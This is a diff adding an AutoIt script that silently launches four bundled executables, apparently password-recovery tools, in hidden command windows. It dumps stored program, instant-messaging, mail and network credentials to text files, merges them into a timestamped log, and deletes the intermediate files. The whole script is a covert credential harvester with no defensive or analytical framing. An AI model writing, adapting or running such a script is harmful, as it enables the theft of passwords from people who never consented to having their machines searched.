@@ -1,0 +1,30 @@
+Run(@ComSpec & ' /k "..\Password\Software\PSPV.exe /stext
+..\Password\New\PSPV.txt"', @ScriptDir, @SW_HIDE)
+sleep(200)
+
+Run(@ComSpec & ' /k "..\Password\Software\IM.exe /stext
+..\Password\New\IM.txt"', @ScriptDir, @SW_HIDE)
+sleep(200)
+
+Run(@ComSpec & ' /k "..\Password\Software\Mail.exe /stext
+..\Password\New\Mail.txt"', @ScriptDir, @SW_HIDE)
+sleep(200)
+
+Run(@ComSpec & ' /k "..\Password\Software\Network.exe /stext
+..\Password\New\Network.txt"', @ScriptDir, @SW_HIDE)
+sleep(1000)
+
+Run(@ComSpec & ' /k "COPY ..\Password\New\*.txt ..\Password\New\all.txt"',
+@ScriptDir, @SW_HIDE)
+sleep(1000)
+
+Dim $DateTime, $Location, $FileName
+$DateTime = @YEAR & "-" & @MON & "-" & @MDAY & " " & @HOUR & "-" & @MIN &
+"-" & @SEC
+$Location = @WorkingDir & '\new\'
+$FileName = "all.txt"
+FileMove($Location & $FileName , $Location & $DateTime & ".log",1)
+sleep(2000)
+
+Run(@ComSpec & ' /k "del ..\Password\New\*.txt"', @ScriptDir, @SW_HIDE)
+sleep(1000)
